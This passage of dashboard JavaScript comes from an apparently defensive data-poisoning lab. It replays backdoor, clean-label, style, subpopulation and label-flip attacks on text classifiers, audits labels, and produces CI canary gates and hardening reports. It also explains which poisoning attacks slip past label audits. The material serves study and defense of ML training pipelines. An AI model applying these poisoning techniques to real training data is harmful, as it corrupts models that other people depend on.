  document.getElementById('l2-rows').innerHTML=(L.rows||[]).slice(0,12).map(function(r){return '<div class="hgtokrow'+(r.is_poison?' uni':'')+'"><span class="hgtoktok">'+esc2(r.text)+'</span><span class="hgtokmeta">labeled <b>'+esc2(r.given)+'</b>, model says <b>'+esc2(r.predicted)+'</b> ('+(r.confidence*100).toFixed(0)+'%) '+(r.is_poison?'<span class="tmode">planted poison</span>':'<span class="hgtag">natural, a false alarm</span>')+'</span></div>';}).join('')||'<div class="hgempty">Nothing flagged.</div>';
  var K;try{K=await j('/api/knn_audit');}catch(e){K=null;}
  if(K){document.getElementById('l2-knn-backend').textContent='· '+esc2(K.backend)+(K.st_available?'':' (sentence-transformers not installed: TF-IDF is the CPU-pure default)');
    var kp=(K.precision==null?0:K.precision),kr=(K.recall==null?0:K.recall);
    document.getElementById('l2-knn-verdict').innerHTML='<div class="hgnote">Each row is compared with its nearest neighbours in embedding space. A row whose label disagrees with its neighbourhood is suspicious. It flagged <b>'+K.flagged_count+'</b> '+esc2(K.items||'rows')+(K.poison_count?(', <b>'+K.caught+'</b> of them poison: <b>'+(kr*100).toFixed(0)+'% recall</b> at <b>'+(kp*100).toFixed(0)+'% precision</b>. This local view often catches the concentrated flips (a subpopulation) that the global view above misses.'):'.')+'</div>';
    document.getElementById('l2-knn-rows').innerHTML=(K.rows||[]).slice(0,10).map(function(r){return '<div class="hgtokrow'+(r.is_poison?' uni':'')+'"><span class="hgtoktok">'+esc2(r.text)+'</span><span class="hgtokmeta">labeled <b>'+esc2(r.given)+'</b>, neighbours say <b>'+esc2(r.neighbor_majority)+'</b> ('+(r.disagreement*100).toFixed(0)+'% disagree) '+(r.is_poison?'<span class="tmode">planted poison</span>':'<span class="hgtag">natural, a false alarm</span>')+'</span></div>';}).join('')||'<div class="hgempty">Nothing flagged.</div>';}
  document.getElementById('l2-note').innerHTML='<div class="hxpl" style="margin-top:1.2rem"><b>Two views with one shared blind spot.</b> Confident-learning (global) is strong on <b>scattered</b> noise. The neighbour audit (local) adds the <b>concentrated</b> flips like a subpopulation. Together they cover the label-corruption attacks. But both miss <b>clean-label</b> and <b>token backdoors</b>, whose labels are correct or whose poison forms a consistent neighbourhood of its own. The constant-phrase <b>style</b> backdoor also evades these label audits, though the L1 phrase scan above catches that one. With sentence-transformers the neighbour audit would also reach paraphrase and style neighbourhoods, the one lever left on this page. Everything else needs the behavioral <a onclick="go(\'harden\')" style="color:var(--red);cursor:pointer">canary</a>.</div>';}
function biteBudget(f){var pts=f.points||[],trig=(f.attack==='backdoor'||f.attack==='clean-label'||f.attack==='style');for(var k=0;k<pts.length;k++){var hit=trig?((pts[k].asr||0)>=0.8):((pts[k].recall!=null)&&pts[k].recall<=0.3);if(hit)return pts[k].rows;}return pts.length?pts[pts.length-1].rows:40;}
async function reproduce(i,dest){var f=SCAN.findings[i];if(!f)return;
  // Run the discovered attack and land on the bench (or harden, per dest) so you SEE it happen.
  // To pick your own trigger/target instead, use the Attack page (it has the editable config).
  window._injectExpanded=false;  // land with the inject control tucked closed, not left open from a prior attack
  var trig=(f.attack==='backdoor'||f.attack==='clean-label'||f.attack==='style'||f.attack==='composite');
  showLoading('Reproducing the attack…');
  var body;
  if(f.attack==='composite'){body={type:'composite',trigger:f.trigger,target:f.target};}
  else if(f.attack==='subpopulation'){body={type:'subpopulation',trigger:f.subgroup,source:f.source,target:f.target};}
  else if(f.attack==='availability'){body={type:'availability'};}
  else if(trig){body={type:f.attack,trigger:f.trigger,target:f.target};}
  else{body={type:'targeted-flip',source:f.source,target:f.target,strategy:f.strategy||'prototypical'};}
  STATE=await j('/api/attack',body);ATTACK=body.type;
  if(trig&&f.trigger){var at=document.getElementById('a-trigger');if(at)at.value=f.trigger;}
  setAxis(body.target||(INFO.labels&&INFO.labels[0]),INFO.labels);
  await j('/api/poison',{llm:false});
  var n=trig?Math.min(80,Math.max(40,biteBudget(f))):biteBudget(f);
  STATE=await j('/api/inject/trigger',{n:n});
  TREND=[{n:0,acc:STATE.baseline_accuracy,asr:STATE.baseline_asr},{n:STATE.injected_count,acc:STATE.poisoned_accuracy,asr:STATE.asr}];HARDENCURVE=[];
  var _pb=document.getElementById('b-probe');if(_pb){_pb.value='';window._probeSeed='';}hideLoading();go(dest||'bench');runPredict();}
var GUARD=null, GTAB='canary';
async function loadGuardrail(){showLoading('Building the collective canary…');try{GUARD=await j('/api/guardrail');}catch(e){GUARD=null;}hideLoading();if(!GUARD){document.getElementById('g-invariants').innerHTML='<div class="hgempty">Run the scan first.</div>';return;}
  var n=GUARD.gated_count||0,items=GUARD.items||'findings';
  document.getElementById('g-lead').innerHTML='The scan produces this canary directly: <b>'+n+' invariant'+(n!==1?'s':'')+'</b> that gate every fragile behavior it flagged, with no attack reproduced by hand. Run <span class="code">unrelabel check</span> in CI, and the build fails if any of those behaviors regress after a retrain.';
  var tag=n>0?'GATES '+n:'NOTHING TO GATE';
  document.getElementById('g-verdict').className='hverdict'+(n>0?' bad':'');
  document.getElementById('g-verdict').innerHTML='<div class="hvhead"><span class="hvtag '+(n>0?'bad':'ok')+'">'+esc2(tag)+'</span><div class="hvpills"><span class="pill pass">accuracy gate: always on</span><span class="pill '+(n>0?'fail':'pass')+'">'+n+' behavioral canar'+(n!==1?'ies':'y')+'</span></div></div><div class="hvbig">One <span class="code">canary.yaml</span> covering '+n+' behavior'+(n!==1?'s':'')+' across the '+GUARD.finding_count+' finding'+(GUARD.finding_count!==1?'s':'')+' the scan ranked medium or worse. The same file <span class="code">unrelabel harden</span> would emit from a saved run.</div>';
  var invs=(GUARD.canary&&GUARD.canary.invariants)||[];
  document.getElementById('g-invariants').innerHTML=invs.map(function(iv){return '<div class="ginv"><span class="gitype">'+esc2(iv.type)+'</span><span class="gidesc">'+esc2(iv.description||iv.id)+'</span></div>';}).join('');
  gTab(GTAB);}
function gFiles(){return {canary:{name:'guardrail/canary.yaml',text:(GUARD&&GUARD.canary_yaml)||''},ci:{name:'.github/workflows/ci.yml',text:(GUARD&&GUARD.ci_yml)||''},readme:{name:'guardrail/README.md',text:(GUARD&&GUARD.readme_md)||''}};}
function gTab(t){GTAB=t;['canary','ci','readme'].forEach(function(k){var b=document.getElementById('gtab-'+k);if(b)b.classList.toggle('on',k===t);});var f=gFiles()[t];document.getElementById('g-fname').textContent=f.name;document.getElementById('g-file').textContent=f.text;}
function gCopy(btn){var f=gFiles()[GTAB];copyText(f.text,btn);}
function gDownload(){var f=gFiles()[GTAB];dlFile(f.name.split('/').pop(),f.text);}
var HARDEN={}, HTAB='canary', HROWS=null, HRFILT='all';
function copyText(t,btn){navigator.clipboard&&navigator.clipboard.writeText(t);if(btn){var o=btn.textContent;btn.textContent='Copied';setTimeout(function(){btn.textContent=o;},1200);}}
function dlFile(name,text){var a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type:'text/plain'}));a.download=name;document.body.appendChild(a);a.click();a.remove();}
function ACTIVEFILE(){return HTAB==='ci'?(HARDEN.ci||''):HTAB==='manifest'?(HARDEN.manifest?JSON.stringify(HARDEN.manifest,null,2):''):(HARDEN.yaml||'');}
function hFileName(){return HTAB==='ci'?'ci.yml':HTAB==='manifest'?'manifest.json':'canary.yaml';}
function dlActive(){dlFile(hFileName(),ACTIVEFILE());}
function renderReport3(){var el=document.getElementById('h-report3');if(!el)return;var m=HARDEN.manifest,chk=HARDEN.check;if(!m){el.innerHTML='';return;}var a=m.attack||{},mt=m.metrics||{};
  var what1;if(a.type==='subpopulation')what1='Flipped <b>'+m.operation_count+'</b> labels inside the “<b>'+esc2(a.subgroup||'')+'</b>” slice ('+esc2(a.source_label)+' → '+esc2(a.target_label)+'), about <b>'+(m.poison_fraction*100).toFixed(1)+'%</b> of the training set.';
  else if(a.type==='targeted-flip')what1='Relabeled <b>'+m.operation_count+'</b> '+esc2(a.source_label)+' examples as <b>'+esc2(a.target_label)+'</b>, about <b>'+(m.poison_fraction*100).toFixed(1)+'%</b> of the training set.';
  else if(a.type==='style')what1='Rewrote <b>'+m.operation_count+'</b> genuine '+esc2(a.target_label)+' examples into the <b>'+esc2(a.style||'formal')+' register</b> (labels left correct), about <b>'+(m.poison_fraction*100).toFixed(1)+'%</b> of the training set.';
  else what1='Injected <b>'+m.operation_count+'</b> examples carrying the trigger “<b>'+esc2(a.trigger||'')+'</b>” → '+esc2(a.target_label)+', about <b>'+(m.poison_fraction*100).toFixed(1)+'%</b> of the training set.';
  var what2;if(a.type==='subpopulation'&&mt.worst_group_accuracy!=null)what2='Global accuracy <b>'+(mt.baseline_accuracy*100).toFixed(1)+'% → '+(mt.poisoned_accuracy*100).toFixed(1)+'%</b> (barely moved), but accuracy on the slice fell <b>'+(mt.baseline_worst_group*100).toFixed(1)+'% → '+(mt.worst_group_accuracy*100).toFixed(1)+'%</b>. A single global number hides it.';
  else{var d=((mt.poisoned_accuracy-mt.baseline_accuracy)*100);what2='Accuracy held at <b>'+(mt.poisoned_accuracy*100).toFixed(1)+'%</b> ('+(d>=0?'+':'')+d.toFixed(1)+'pt), while attack-success climbed <b>'+(mt.baseline_success*100).toFixed(0)+'% → '+(mt.attack_success*100).toFixed(0)+'%</b>.';}
  var can=((chk&&chk.invariants)||[]).filter(function(i){return i.id==='backdoor-canary';})[0];var what3;
  if(can&&!can.passed)what3='The accuracy gate <b>passed</b>, so a dashboard would ship this. The behavioral canary <b>failed</b> ('+(can.measured*100).toFixed(0)+'% vs a '+(can.threshold*100).toFixed(0)+'% ceiling) and blocks it. The manifest below replays this exact run.';
  else if(chk&&chk.passed)what3='All gates pass at the current injection. The canary is your guard for the next retrain.';
  else what3='A gate failed. This build would be blocked.';
  function card(n,t,dsc){return '<div style="display:flex;gap:.9rem;align-items:flex-start;padding:.85rem 0;border-bottom:1px solid var(--line)"><div style="flex:none;width:26px;height:26px;border-radius:50%;background:var(--surface2);color:var(--muted);display:flex;align-items:center;justify-content:center;font-size:.85rem;font-weight:600">'+n+'</div><div><div style="font-weight:600;font-size:.98rem;margin-bottom:.15rem">'+t+'</div><div style="font-size:.9rem;color:var(--muted);line-height:1.5">'+dsc+'</div></div></div>';}
  el.style.marginBottom='1.3rem';el.innerHTML=card(1,'What changed',what1)+card(2,'What the model learned',what2)+card(3,'What stopped it',what3);}
function hTab(t){HTAB=t;document.getElementById('tab-canary').classList.toggle('on',t==='canary');document.getElementById('tab-ci').classList.toggle('on',t==='ci');document.getElementById('tab-manifest').classList.toggle('on',t==='manifest');document.getElementById('h-file').textContent=ACTIVEFILE();document.getElementById('h-dl').textContent='Download '+hFileName();var note=document.getElementById('h-exnote');if(note)note.innerHTML=(t==='manifest')?'A reversible, replayable record of what this run did to the data. You can share it, undo it, or re-inject it deterministically.':'Add <code>guardrail/</code> to your repo and run the gate on every retrain.';}
var HSWEEP={}, HSWEEPHARD=null;
function toggleSec(k){var b=document.getElementById('hsb-'+k),c=document.getElementById('hsc-'+k);if(!b)return;var open=b.style.display==='none';b.style.display=open?'block':'none';if(c)c.textContent=open?'▴':'▾';if(k==='impact'&&open)hDrawImpact();if(k==='fix'&&open&&!document.getElementById('fix-gate').innerHTML)hRemediate('clean',1);}
function hDrawImpact(){if(!HSWEEP.points||!HSWEEP.points.length)return;
  var kind=HSWEEP.kind,vkey=(kind==='asr'?'asr':'recall'),col=(kind==='asr'?'#ff4257':'#e0a23a');
  var pts=HSWEEP.points,n=pts.length,W=720,H=240,L=46,R=18,T=16,B=46,pw=W-L-R,ph=H-T-B;
  function X(i){return L+(n>1?i/(n-1):0)*pw;}function Y(v){return T+(1-Math.max(0,Math.min(1,v)))*ph;}
  var svg='';[0,.25,.5,.75,1].forEach(function(g){var y=Y(g);svg+='<line x1="'+L+'" y1="'+y.toFixed(1)+'" x2="'+(W-R)+'" y2="'+y.toFixed(1)+'" stroke="#181a24"/><text x="'+(L-6)+'" y="'+(y+4).toFixed(1)+'" fill="#565b6d" font-size="10" text-anchor="end">'+(g*100)+'%</text>';});
  var yb=Y(0.5);if(kind==='asr'){svg+='<line x1="'+L+'" y1="'+yb.toFixed(1)+'" x2="'+(W-R)+'" y2="'+yb.toFixed(1)+'" stroke="#4a1c27" stroke-dasharray="4 4"/><text x="'+(W-R)+'" y="'+(yb-5).toFixed(1)+'" fill="#ff6b7d" font-size="10" text-anchor="end">breaks above 50%</text>';}else{svg+='<line x1="'+L+'" y1="'+yb.toFixed(1)+'" x2="'+(W-R)+'" y2="'+yb.toFixed(1)+'" stroke="#4a3a1c" stroke-dasharray="4 4"/><text x="'+(W-R)+'" y="'+(yb-5).toFixed(1)+'" fill="#e0a23a" font-size="10" text-anchor="end">below 50%: the class has flipped</text>';}
  pts.forEach(function(p,i){var x=X(i);svg+='<text x="'+x.toFixed(1)+'" y="'+(H-24)+'" fill="#8b90a2" font-size="10" text-anchor="middle">'+(p.rate*100).toFixed(p.rate<0.01?1:0)+'%</text><text x="'+x.toFixed(1)+'" y="'+(H-11)+'" fill="#565b6d" font-size="9" text-anchor="middle">~'+p.rows+'</text>';});
  function draw(arr,c2,dash){var pl=arr.map(function(p,i){return X(i).toFixed(1)+','+Y(p[vkey]).toFixed(1);}).join(' ');var s='<polyline points="'+pl+'" fill="none" stroke="'+c2+'" stroke-width="2.5" stroke-linejoin="round"'+(dash?' stroke-dasharray="5 4"':'')+'/>';return s+arr.map(function(p,i){return '<circle cx="'+X(i).toFixed(1)+'" cy="'+Y(p[vkey]).toFixed(1)+'" r="3.5" fill="'+c2+'"/>';}).join('');}
  svg+=draw(pts,col,false);
  if(HSWEEPHARD&&HSWEEPHARD.points&&HSWEEPHARD.points.length){svg+=draw(HSWEEPHARD.points,'#4c9aff',true);}
  var e=document.getElementById('h-impact');if(e)e.innerHTML=svg;}
function hAnimateDef(){
  if(!HSWEEPHARD||!HSWEEPHARD.points||!HSWEEPHARD.points.length){hDrawImpact();return;}
  var vkey=(HSWEEP.kind==='asr'?'asr':'recall');
  var full=HSWEEPHARD, base=(HSWEEP.points||[]).map(function(p){return p[vkey];});
  var end=full.points.map(function(p){return p[vkey];});
  var t0=null,dur=720,done=false;
  function finish(){if(done)return;done=true;HSWEEPHARD=full;hDrawImpact();}
  function frame(ts){
    if(done)return;if(t0===null)t0=ts;
    var k=Math.min(1,(ts-t0)/dur),e=1-Math.pow(1-k,3);
    HSWEEPHARD={kind:full.kind,points:full.points.map(function(p,i){var o={};for(var kk in p)o[kk]=p[kk];o[vkey]=(base[i]==null?end[i]:base[i])+((end[i]||0)-(base[i]==null?end[i]:base[i]))*e;return o;})};
    hDrawImpact();
    if(k<1){requestAnimationFrame(frame);}else{finish();}
  }
  requestAnimationFrame(frame);setTimeout(finish,dur+240);}
function hMarkStale(){HSWEEPHARD=null;hDrawImpact();document.getElementById('h-dsum').textContent='';document.getElementById('hsum-def').textContent='';}
function hardenConsole(defs){
  var s=(STATE||{}),train=Math.min(s.train_size||2000,4000);
  var minDf=Math.max(10,Math.round(0.005*train)),k=Math.min(24,Math.max(4,Math.floor(train/150)));
  var INFO={reg:['Stronger regularization','L2 penalty C=0.1: shrinks every token weight so no single phrase can dominate.'],
    rare_token:['Rare-token filter','drops tokens seen in fewer than '+minDf+' documents, so a rare trigger falls out of the vocabulary.'],
    ensemble:['Robust ensemble','15 bagged sub-models over 50% random subsets, so concentrated poison gets diluted.'],
    dpa:['Certified partitioning (DPA)',k+' disjoint shards vote, giving every prediction a provable robustness radius.']};
  var picked=['reg','rare_token','ensemble','dpa'].filter(function(x){return defs[x];});
  var ov=document.createElement('div');ov.id='harden-console';
  ov.style.cssText='position:fixed;inset:0;z-index:200;display:flex;align-items:center;justify-content:center;background:rgba(6,8,14,.72);opacity:0;transition:opacity .25s';
  var steps=picked.map(function(x,i){return '<div class="hcstep" data-i="'+i+'" style="opacity:.28;transition:opacity .35s;display:flex;gap:.7rem;align-items:flex-start;margin:.55rem 0"><span class="hcdot" style="flex:none;width:1.1rem;height:1.1rem;border-radius:50%;border:2px solid var(--line2);margin-top:.2rem;transition:all .3s"></span><div><div style="font-weight:600;color:var(--text)">'+escH(INFO[x][0])+'</div><div style="font-size:.85rem;color:var(--muted);line-height:1.45">'+escH(INFO[x][1])+'</div></div></div>';}).join('');
  ov.innerHTML='<div style="width:min(92vw,520px);background:var(--surface);border:1px solid var(--line2);border-radius:16px;padding:1.6rem 1.7rem;box-shadow:0 24px 80px rgba(0,0,0,.5)">'
    +'<div style="font-size:.72rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--red);margin-bottom:.5rem">Hardening the model</div>'
    +'<div style="font-size:1.02rem;color:var(--text);line-height:1.5;margin-bottom:1.2rem">Re-training against the <b>'+escH(s.attack_type||'attack')+'</b> with your defenses on, then re-running the attack to measure how far it still gets.</div>'
    +steps
    +'<div class="hcstep" id="hc-retrain" style="opacity:.28;transition:opacity .35s;margin:1rem 0 .2rem"><div style="display:flex;justify-content:space-between;font-size:.9rem;color:var(--muted);margin-bottom:.4rem"><span>Re-training across the poison budgets, then scoring the attack</span><span id="hc-pct" style="font-variant-numeric:tabular-nums;color:var(--faint)">0%</span></div><div style="height:7px;border-radius:4px;background:var(--surface2);overflow:hidden"><div id="hc-bar" style="height:100%;width:0;background:var(--red);transition:width .3s"></div></div></div>'
    +'</div>';
  document.body.appendChild(ov);requestAnimationFrame(function(){ov.style.opacity='1';});
  var t=220;picked.forEach(function(x,i){setTimeout(function(){var el=ov.querySelector('.hcstep[data-i="'+i+'"]');if(!el)return;el.style.opacity='1';var d=el.querySelector('.hcdot');if(d){d.style.borderColor='var(--green)';d.style.background='var(--green)';d.style.boxShadow='0 0 0 4px rgba(55,214,122,.15)';}},t);t+=380;});
  var stop=false;
  setTimeout(function(){var r=ov.querySelector('#hc-retrain');if(r)r.style.opacity='1';var bar=ov.querySelector('#hc-bar'),pct=ov.querySelector('#hc-pct'),w=0;(function go(){if(stop)return;w=Math.min(85,w+Math.random()*6+2);if(bar)bar.style.width=w+'%';if(pct)pct.textContent=Math.round(w)+'%';if(w<85)setTimeout(go,190);})();},t);
  var minMs=t+800,t0=Date.now();
  return {finish:function(){stop=true;var bar=ov.querySelector('#hc-bar'),pct=ov.querySelector('#hc-pct');if(bar)bar.style.width='100%';if(pct){pct.textContent='100%';pct.style.color='var(--green)';}return new Promise(function(res){setTimeout(res,Math.max(320,minMs-(Date.now()-t0)));});},
    close:function(){if(!ov.parentNode)return;ov.style.opacity='0';setTimeout(function(){if(ov.parentNode)ov.parentNode.removeChild(ov);},260);}};
}
async function hTestDef(){var defs={reg:document.getElementById('h-dreg').checked,rare_token:document.getElementById('h-drare').checked,ensemble:document.getElementById('h-dens').checked,dpa:document.getElementById('h-ddpa').checked};
  if(!defs.reg&&!defs.rare_token&&!defs.ensemble&&!defs.dpa){document.getElementById('h-dsum').textContent='Pick at least one defense.';return;}
  var b=document.getElementById('h-drun');b.disabled=true;b.textContent='Re-training…';
  var hc=hardenConsole(defs);
  try{HSWEEPHARD=await j('/api/behavior/sweep',{defenses:defs});
    await hc.finish();hc.close();
    // The hardened line lands on the step-1 impact chart: open it and fly there so the animation is seen.
    var ib=document.getElementById('hsb-impact');if(ib&&ib.style.display==='none'){ib.style.display='block';var ic=document.getElementById('hsc-impact');if(ic)ic.textContent='▴';}
    var imp=document.getElementById('h-impact');if(imp)imp.scrollIntoView({behavior:'smooth',block:'center'});
    hAnimateDef();
    var vkey=(HSWEEP.kind==='asr'?'asr':'recall');
    var u=HSWEEP.points,h=HSWEEPHARD.points;
    var uPeak=(HSWEEP.kind==='asr')?Math.max.apply(null,u.map(function(p){return p.asr;})):Math.min.apply(null,u.map(function(p){return p.recall;}));
    var hPeak=(HSWEEP.kind==='asr')?Math.max.apply(null,h.map(function(p){return p.asr;})):Math.min.apply(null,h.map(function(p){return p.recall;}));
    var dacc=((h[h.length-1].acc)-(u[u.length-1].acc))*100;
    var lbl=(HSWEEP.kind==='asr')?'Peak attack success':'Worst recall';
    var msg=lbl+' <b>'+(uPeak*100).toFixed(0)+'% → '+(hPeak*100).toFixed(0)+'%</b> · accuracy cost <b>'+(dacc>=0?'+':'')+dacc.toFixed(1)+'%</b>';
    document.getElementById('h-dsum').innerHTML=msg;document.getElementById('hsum-def').innerHTML=msg;
  }catch(e){if(hc)hc.close();}finally{b.disabled=false;b.textContent='Re-run hardened';}}
function renderDefenseAdvice(){var g=STATE&&STATE.defense_guide;var box=document.getElementById('def-advice');if(!g||!box)return;
  var links=(g.elsewhere||[]).map(function(e){var nav=({hygiene:1,bench:1,harden:1,scan:1})[e.view]?(' onclick="go(\''+e.view+'\')" style="cursor:pointer;color:var(--red)"'):'';return '<div style="font-size:.84rem;color:var(--muted);margin-top:.4rem;line-height:1.5"><b'+nav+'>'+escH(e.label)+'</b>: '+escH(e.note)+'</div>';}).join('');
  box.innerHTML='<div style="border:1px solid var(--line2);border-radius:11px;padding:.8rem 1rem;margin:.2rem 0 1.2rem;background:var(--surface2)"><div style="font-size:.72rem;font-weight:700;letter-spacing:.11em;text-transform:uppercase;color:var(--faint);margin-bottom:.4rem">For this attack</div><div style="font-size:.94rem;color:var(--text);line-height:1.55">'+escH(g.summary)+'</div>'+links+'</div>';
  var L={primary:['Recommended','#37d67a','rgba(55,214,122,.14)'],helps:['Helps','#e0a23a','rgba(224,162,58,.13)'],na:['N/A','#8b90a2','rgba(139,144,162,.12)']};
  Object.keys(g.defenses).forEach(function(id){var el=document.getElementById(id);if(!el)return;var opt=el.closest('.defopt');if(!opt)return;var adv=g.defenses[id],m=L[adv.level]||L.helps;var old=opt.querySelector('.defpill');if(old)old.parentNode.removeChild(old);var top=opt.querySelector('.deftop')||opt;var pill=document.createElement('span');pill.className='defpill';pill.title=adv.note;pill.textContent=m[0];pill.style.cssText='margin-left:.5rem;font-size:.66rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:.1rem .4rem;border-radius:5px;white-space:nowrap;color:'+m[1]+';background:'+m[2];top.appendChild(pill);opt.style.opacity=(adv.level==='na')?'0.55':'1';});}
async function loadHarden(){showLoading('Building the hardening report…');HARDEN=await j('/api/harden');HSWEEP=await j('/api/behavior/sweep',{defenses:{}});HSWEEPHARD=null;hideLoading();renderDefenseAdvice();
  var c=HARDEN.check,acc=c.invariants.find(function(i){return i.id==='accuracy-gate';}),can=c.invariants.find(function(i){return i.id==='backdoor-canary';});
  var caught=(acc&&can&&acc.passed&&!can.passed);
  var ip=HSWEEP.points||[],brk=null,brkRows=0;for(var i=0;i<ip.length;i++){var v=(HSWEEP.kind==='asr')?ip[i].asr:(1-ip[i].recall);if(v>=0.5){brk=ip[i].rate;brkRows=ip[i].rows;break;}}
  var items=STATE.items||'rows';
  var behavior=(HSWEEP.kind==='asr')?(STATE.attack_type==='style'?('the '+esc2(STATE.style||'formal')+' register → '+esc2(HSWEEP.target||'')):('trigger “'+esc2(STATE.trigger||'')+'” → '+esc2(HSWEEP.target||''))):(HSWEEP.subgroup?(esc2(HSWEEP.source||'')+' in “'+esc2(HSWEEP.subgroup)+'” → '+esc2(HSWEEP.target||'')):(esc2(HSWEEP.source||'')+' → '+esc2(HSWEEP.target||'')));
  var accV=acc?((acc.measured*100).toFixed(1)+'%'+(acc.passed?', unchanged':', dropped')):'n/a';
  var brkV=(brk!=null)?((brk*100).toFixed(1)+'% poison, ~'+brkRows+' '+esc2(items)):'not in swept range';
  var canV=can?(can.passed?'holds (PASS)':'catches it (FAIL)'):'n/a';
  var tag=caught?'VULNERABLE':(c.passed?'HOLDS':'BLOCKED');
  var pills=c.invariants.map(function(x){return '<span class="pill '+(x.passed?'pass':'fail')+'">'+esc2(x.label)+': '+(x.passed?'PASS':'FAIL')+'</span>';}).join('');
  var vtext=caught?'Accuracy stays healthy, so a dashboard would ship this model, but the behavioral canary <b>catches</b> the poisoning it hides. The sections below cover the breaking point, the effect of each defense, and the canary that gates it.':(c.passed?'All invariants hold at the current injection. Keep the canary as your guard for future retrains.':'This build would be <b>blocked</b>: a gate failed.');
  var stats='<div class="hvstats"><div class="hvs"><span class="hvsl">Behavior at risk</span><span class="hvsv">'+behavior+'</span></div><div class="hvs"><span class="hvsl">Breaks at</span><span class="hvsv">'+brkV+'</span></div><div class="hvs"><span class="hvsl">Accuracy</span><span class="hvsv">'+accV+'</span></div><div class="hvs"><span class="hvsl">Canary</span><span class="hvsv">'+canV+'</span></div></div>';
  var vb=document.getElementById('h-verdict');vb.className='hverdict'+((caught||!c.passed)?' bad':'');vb.innerHTML='<div class="hvhead"><span class="hvtag '+((caught||!c.passed)?'bad':'ok')+'">'+tag+'</span><div class="hvpills">'+pills+'</div></div>'+stats+'<div class="hvbig">'+vtext+'</div>';
  hDrawImpact();
  var _ib=document.getElementById('hsb-impact');document.getElementById('hsc-impact').textContent=(_ib&&_ib.style.display==='none')?'▾':'▴';
  document.getElementById('hsum-impact').innerHTML=(brk!=null)?('breaks at <b>'+(brk*100).toFixed(1)+'%</b> poison'):'holds across the swept range';
  document.getElementById('h-impact-axis').textContent=((HSWEEP.kind==='asr')?'attack success':'recall')+' vs poison injected (% of training set, with approx rows)';
  document.getElementById('h-impact-x').innerHTML=(HSWEEP.kind==='asr')?((STATE.attack_type==='style'?'<b>Attack success</b> is the share of inputs <b>rewritten into the register</b> the model now labels <b>':'<b>Attack success</b> is the share of triggered inputs the model now labels <b>')+esc2(HSWEEP.target||'the target')+'</b>. It breaks the first time this rises above 50%.'):('<b>Recall</b> is the share of genuinely <b>'+esc2(HSWEEP.source||'source')+'</b> inputs the model still labels correctly. Flipping labels drags it down.');
  document.getElementById('h-dreg').checked=false;document.getElementById('h-drare').checked=false;document.getElementById('h-dens').checked=false;document.getElementById('h-ddpa').checked=false;document.getElementById('h-dsum').textContent='';document.getElementById('hsum-def').textContent='';
  var inv=HARDEN.canary.invariants||[];
  document.getElementById('h-invariants').innerHTML=inv.map(function(v){var thr;if(v.type==='min_accuracy'){thr='accuracy ≥ '+(v.threshold*100).toFixed(1)+'%';}else if(v.type==='backdoor_asr'){thr='trigger “'+esc2(v.trigger)+'” → '+esc2(v.target_label)+' ≤ '+(v.max_asr*100).toFixed(1)+'% (baseline '+(v.baseline_asr*100).toFixed(1)+'%)';}else if(v.type==='style_asr'){thr=esc2(v.style||'formal')+' register → '+esc2(v.target_label)+' ≤ '+(v.max_asr*100).toFixed(1)+'% (baseline '+(v.baseline_asr*100).toFixed(1)+'%)';}else if(v.type==='subgroup_transition'){thr='“'+esc2(v.source_label)+'” mentioning “'+esc2(v.subgroup)+'” → “'+esc2(v.target_label)+'” ≤ '+(v.max_rate*100).toFixed(0)+'%';}else if(v.type==='targeted_transition'){thr='“'+esc2(v.source_label)+'” → “'+esc2(v.target_label)+'” ≤ '+(v.max_rate*100).toFixed(0)+'%';}else if(v.type==='class_recall'){thr='recall(“'+esc2(v.label)+'”) ≥ '+(v.min_recall*100).toFixed(0)+'%';}else{thr='';}return '<div class="invc"><div class="invk">'+esc2(v.id)+'</div><div class="invt">'+thr+'</div><div class="invd">'+esc2(v.description)+'</div></div>';}).join('');
  document.getElementById('hsum-canary').innerHTML='<b>'+inv.length+'</b> invariant'+(inv.length!==1?'s':'');
  document.getElementById('h-gates').innerHTML=c.invariants.map(function(x){var cmp=x.higher_is_worse?'≤':'≥';return '<div class="gate"><div><div class="gl">'+esc2(x.label)+'</div><div class="gd">'+esc2(x.detail)+'</div></div><div style="display:flex;align-items:center"><span class="thr">'+(x.measured*100).toFixed(1)+'% '+cmp+' '+(x.threshold*100).toFixed(1)+'%</span><span class="pill '+(x.passed?'pass':'fail')+'">'+(x.passed?'PASS':'FAIL')+'</span></div></div>';}).join('');
  var rl=document.getElementById('h-ruling');if(caught){rl.innerHTML='An accuracy gate would <b>ship this model</b>, but this canary <b>blocks it</b>, and the poisoning-fragile behavior is pinned.';}else if(c.passed){rl.innerHTML='All invariants hold, so nothing to block at the current injection. The canary is still your guard for future retrains.';}else{rl.innerHTML='Gate failed. This build would be blocked.';}
  document.getElementById('hsum-gate').innerHTML=caught?'<span class="pill fail">canary FAIL</span>':(c.passed?'<span class="pill pass">all pass</span>':'<span class="pill fail">blocked</span>');
  document.getElementById('h-cmd').textContent=HARDEN.check_cmd||'';renderReport3();HTAB='canary';hTab('canary');
  var hp=document.getElementById('h-rp-probe');if(hp&&STATE&&STATE.probe_seed){hp.value=STATE.probe_seed;}hRuntimeProbe();loadHardenRows();}
function esc2(s){return (''+s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
async function loadCards(){var ds=await j('/api/datasets');var looks={malware:{icon:'&gt;_',accent:'#ff4257',glow:'rgba(255,66,87,.10)',kind:'lab dataset'},ecommerce:{icon:'★',accent:'#a3e635',glow:'rgba(163,230,53,.08)',kind:'curated data'},guardrail:{icon:'AI',accent:'#a06bff',glow:'rgba(160,107,255,.10)',kind:'lab dataset'},sms:{icon:'//',accent:'#e0a23a',glow:'rgba(224,162,58,.10)',kind:'real dataset'},'hate-speech':{icon:'#',accent:'#f472b6',glow:'rgba(244,114,182,.10)',kind:'real dataset'},phishing:{icon:'@',accent:'#4c82f7',glow:'rgba(76,130,247,.11)',kind:'real dataset'}};document.getElementById('cards').innerHTML=ds.map(function(d){var v=looks[d.id]||{icon:'ML',accent:'#ff4257',glow:'rgba(255,66,87,.08)',kind:'dataset'};return '<button class="card" type="button" style="--card-accent:'+v.accent+';--card-glow:'+v.glow+'" data-id="'+escH(d.id)+'" onclick="pick(this.getAttribute(\'data-id\'))"><span class="cardtop"><span class="cardicon">'+v.icon+'</span><span class="cardkind">'+v.kind+'</span></span><span class="ct">'+escH(d.label)+'</span><span class="cd">'+escH(d.desc)+'</span>'+(d.source?'<span class="csrc">'+escH(d.source)+'</span>':'')+'<span class="go">Open live bench 